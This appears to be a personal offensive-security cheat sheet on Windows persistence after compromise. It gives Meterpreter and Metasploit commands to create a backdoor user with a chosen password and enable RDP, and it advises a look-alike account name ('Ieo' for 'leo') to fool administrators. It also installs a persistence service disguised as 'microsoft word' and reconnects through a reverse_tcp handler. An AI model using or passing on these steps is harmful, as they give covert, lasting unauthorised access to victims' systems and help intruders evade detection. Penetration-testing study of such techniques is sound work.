# **Persistence via RDP:**

Create a new user in meterpreter:

	run getgui -e -u asem -p Hacker_123321

Or use the MSF Module:

	post/windows/manage/enable_rdp

To create a user and enable RDP on the target with a username and password of your choice...... COOL#



Then connect using #xfreerdp 

##### Make sure to name the new user added to blend in the other users so it's not sus.
E.g. if there's a user called 
- "leo"  with small L
We create our backdoor user named: 
- "Ieo"  with capital i

these two names are different ðŸ˜²ðŸ˜²ðŸ˜²


##Just make sure the password is long and contain numbers and symbols for the password policy.....


# **<mark style="background: #FF5582A6;">MSF</mark> Module:**

	search platform:windows persistence

This creates a service that will provide us with access all the time to the target system...

	exploit/windows/local/persistence_service

1. Choose a normal service name: `set SERVICE_NAME microsoft word`
2. Don't forget to set the session..

If all session are killed we can still gain access like this:

1. `use multi/handler`
2. Choose the same payload we used on the Persistence service Module above: `set PAYLOAD windows/meterpreter/reverse_tcp` 
3. Choose the same `LHOST` and `LPORT` as the Persistence Service Module.
4. Then just hit run or exploit and we get a session...... Because the service is running on the target and always listening.
